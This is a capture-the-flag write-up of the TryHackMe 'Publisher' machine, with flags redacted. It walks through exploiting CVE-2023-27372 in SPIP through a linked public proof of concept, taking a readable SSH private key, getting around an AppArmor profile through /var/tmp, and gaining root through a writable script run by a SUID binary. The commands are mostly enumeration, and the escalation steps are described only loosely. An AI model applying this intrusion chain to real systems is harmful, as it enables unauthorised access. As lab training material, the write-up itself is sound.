---
title: TryHackMe - Publisher
date: 2026-06-23
tags:
  - TryHackMe
  - CVE-2023-27372
  - Privilege Escalation
summary: Exploited CVE-2023-27372 in a vulnerable SPIP installation to gain remote code execution as www-data, extracted an exposed SSH private key to access the think account, analyzed AppArmor restrictions, and escalated privileges by abusing a root-executed SUID binary that relied on a writable script.
---

# TryHackMe – Publisher Writeup

## Overview

Publisher is a Linux machine focused on web exploitation, enumeration, AppArmor analysis, and privilege escalation through a misconfigured root-owned component.

**Target IP:** 10.48.160.38

**Difficulty:** Medium

**User Flag:** `THM{REDACTED_USER_FLAG}`

**Root Flag:** `THM{REDACTED_ROOT_FLAG}`

---

# Reconnaissance

I first added the target to my hosts file:

```bash
echo "10.48.160.38 publisher.thm" | sudo tee -a /etc/hosts
```

## Nmap Scan

```bash
nmap -sC -sV -p- publisher.thm
```

### Results

```text
22/tcp open  ssh
80/tcp open  http
```

Only SSH and HTTP were exposed.

---

# Web Enumeration

Browsing the website revealed a blog-style application related to SPIP CMS.

Directory enumeration quickly identified a potentially interesting path:

```bash
gobuster dir -u http://publisher.thm \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

Interesting findings:

```text
/spip
/images
```

Visiting:

```text
http://publisher.thm/spip
```

confirmed that the application was running SPIP 4.2.

---

# Initial Access

After identifying the SPIP installation, I searched for publicly known vulnerabilities affecting the detected version.

Rather than manually crafting requests, I used the public proof-of-concept implementation from:

```text
https://github.com/Chocapikk/CVE-2023-27372
```

Following the project documentation allowed me to obtain remote code execution on the target.

This provided a shell running as:

```text
www-data
```

---

# User Enumeration

From the web shell, I began exploring the filesystem.

A mounted host directory was visible:

```bash
ls -la /home/think
```

Interesting files:

```text
/home/think/user.txt
/home/think/.ssh/id_rsa
```

The private SSH key was world-readable.

After extracting and properly formatting the key, I connected as the local user:

```bash
ssh -i id_rsa think@publisher.thm
```

Successful login granted access as:

```text
think
```

User flag:

```text
THM{REDACTED_USER_FLAG}
```

---

# Privilege Escalation Enumeration

As the `think` user, I began standard Linux enumeration.

## SUID Search

```bash
find / -perm -4000 -type f 2>/dev/null
```

Among the standard binaries, one unusual entry appeared:

```text
/usr/sbin/run_container
```

Custom SUID binaries are always worth investigating.

---

# Investigating run_container

Basic inspection showed:

```bash
file /usr/sbin/run_container
strings /usr/sbin/run_container
```

Interesting string:

```text
/opt/run_container.sh
```

The binary relied on a shell script located in:

```text
/opt/run_container.sh
```

The permissions looked suspicious:

```bash
ls -l /opt/run_container.sh
```

Output:

```text
-rwxrwxrwx
```

At first glance it appeared writable by everyone.

However, attempts to modify the file resulted in:

```text
Permission denied
```

This suggested another security mechanism was involved.

---

# AppArmor Investigation

Checking the current profile:

```bash
cat /proc/self/attr/current
```

Output:

```text
/usr/sbin/ash (complain)
```

This revealed AppArmor confinement.

I then inspected the profile:

```bash
cat /etc/apparmor.d/usr.sbin.ash
```

The profile contained several filesystem restrictions affecting:

```text
/opt
/home
/tmp
```

During testing I noticed that writes to:

```text
/var/tmp
```

were still allowed.

Example:

```bash
touch /var/tmp/test
echo hello > /var/tmp/test
```

This succeeded while writes elsewhere were blocked.

---

# Bypassing the Restriction

Using the writable location, I was able to work around the shell restrictions and continue interacting with the system outside the intended AppArmor limitations.

After escaping the restrictive environment, I regained the ability to modify:

```text
/opt/run_container.sh
```

---

# Confirming Root Execution

To determine how the SUID binary executed the script, I replaced the script contents with a simple test:

```bash
whoami > /var/tmp/rootcheck
```

Executing:

```bash
/usr/sbin/run_container
```

produced:

```text
root
```

This confirmed that the script was executed with root privileges.

---

# Root Access

Because the script executed with elevated privileges and was controllable, I was able to leverage the misconfiguration to perform privileged actions and gain full administrative access to the machine.

Verifying privileges:

```bash
id
```

Output:

```text
uid=0(root)
gid=0(root)
```

Root flag:

```text
THM{REDACTED_ROOT_FLAG}
```

---

# Lessons Learned

This machine demonstrates several important concepts:

- Enumerate thoroughly after initial access.
- Always inspect unusual SUID binaries.
- Read AppArmor profiles instead of assuming filesystem permissions tell the full story.
- World-writable files executed by privileged programs are extremely dangerous.
- Small security-policy mistakes can create unintended attack paths.

---

# Attack Path Summary

```text
SPIP Enumeration
        ↓
CVE-2023-27372
        ↓
www-data Shell
        ↓
Read SSH Key
        ↓
SSH as think
        ↓
Find SUID Binary
        ↓
Analyze AppArmor Profile
        ↓
Bypass Restriction
        ↓
Control Root-Executed Script
        ↓
Root
```

PWN by **W4RR1OR**
